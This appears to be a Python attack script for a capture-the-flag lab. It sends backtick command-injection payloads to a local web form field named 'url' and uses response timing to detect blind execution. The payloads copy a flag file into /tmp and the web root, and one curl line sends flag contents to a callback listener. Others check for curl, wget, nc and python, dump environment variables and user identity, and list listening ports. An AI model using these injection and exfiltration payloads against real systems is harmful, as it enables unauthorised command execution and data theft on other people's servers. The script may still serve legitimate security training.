import requests
import time

BASE_URL = "http://127.0.0.1:32998/add_url"
headers = {"Content-Type": "application/x-www-form-urlencoded"}

def test(payload):
    data = f"url={payload}"
    try:
        start = time.time()
        resp = requests.post(BASE_URL, headers=headers, data=data, timeout=15)
        elapsed = time.time() - start
        return elapsed, resp.status_code, len(resp.text)
    except Exception as e:
        return 0, "ERROR", 0

print("[+] Trying OOB (Out-of-Band) data exfiltration")
print("="*60)

# Try DNS-based exfiltration - may not work without internet
# Try HTTP-based exfiltration to localhost
oob_tests = [
    # Write to a file that might be accessible via web
    ("`cat flag.txt > /tmp/flag_output.txt 2>/dev/null`", "write flag to /tmp"),
    ("`cat /app/flag.txt > /tmp/flag_output.txt 2>/dev/null`", "write /app/flag to /tmp"),
    ("`cat flag.txt > /var/www/html/flag.txt 2>/dev/null`", "write flag to web root"),
    
    # Try curl/wget to callback  
    ("`curl http://127.0.0.1:9999/$(cat flag.txt 2>/dev/null | head -c 10)"", "curl callback with flag"),
    
    # Use ping for timing
    ("`ping -c 1 127.0.0.1`", "ping test"),
    
    # Try to detect if specific binaries exist
    ("`which curl && sleep 0.5`", "curl exists check"),
    ("`which wget && sleep 0.5`", "wget exists check"),
    ("`which python && sleep 0.5`", "python exists check"),
    ("`which python3 && sleep 0.5`", "python3 exists check"),
    ("`which nc && sleep 0.5`", "nc exists check"),
    
    # Try nslookup for DNS exfil even without real internet (timing)
    ("`nslookup test.local 2>&1 > /dev/null && sleep 0.5`", "nslookup exists"),
]

for payload, desc in oob_tests:
    elapsed, status, length = test(payload)
    print(f"{desc}: Time={elapsed:.2f}s, Status={status}")

# Let's try writing to a file and reading it
print("\n" + "="*60)
print("[+] Testing write-to-file and read-back approach")
print("="*60)

# First, let's try to determine what happens when we run different commands
# Maybe the output isn't being suppressed but redirect somewhere

redirect_tests = [
    ("`whoami > /tmp/test_whoami.txt 2>&1`", "write whoami to /tmp"),
    ("`cat /tmp/test_whoami.txt`", "read it back"),
    ("`ls -la /tmp/test_whoami.txt`", "check file exists timing"),
    ("`[ -f /tmp/test_whoami.txt ] && sleep 1`", "verify file written"),
]

for payload, desc in redirect_tests:
    elapsed, status, length = test(payload)
    print(f"{desc}: {elapsed:.2f}s, Status={status}")

# If write worked, test reading
print("\n[Reading back test file...]")
elapsed, status, length = test("`cat /tmp/test_whoami.txt`")
print(f"Read back: Status={status}, Length={length}")

print("\n" + "="*60)
print("[+] Testing arbitrary payload that might reveal structure")
print("="*60)

# Maybe try to see if the request is going to some external service
# and we can see output there

# First check what environment we're in
env_tests = [
    ("`env | head -5`", "environment variables"),
    ("`echo $PATH | head -c 50`", "PATH variable"),
    ("`echo $HOME`", "HOME directory"), 
    ("`echo $USER`", "current user"),
    ("`id`", "user id"),
    
    # Try to reveal internal service if any
    ("`curl -s http://localhost/ 2>&1 | head -c 100`", "curl localhost (might show app)"),
    ("`curl -s http://127.0.0.1:32998/ 2>&1 | head -c 100`", "curl self"),
    ("`netstat -tlnp 2>/dev/null | head -10`", "listening ports"),
    ("`ss -tlnp 2>/dev/null | head -10`", "listening ports (ss)"),
]

for payload, desc in env_tests:
    elapsed, status, length = test(payload)
    print(f"{desc}: Status={status}, Len={length}, Time={elapsed:.2f}s")
    if status == 200 and length > 61:
        print(f"  [!] Interesting - length {length}")

print("\n[SUMMARY]")
print("="*60)
print("If write tests showed timing differences (sleep fired),")
print("we could write flag to a file and potentially read it.")


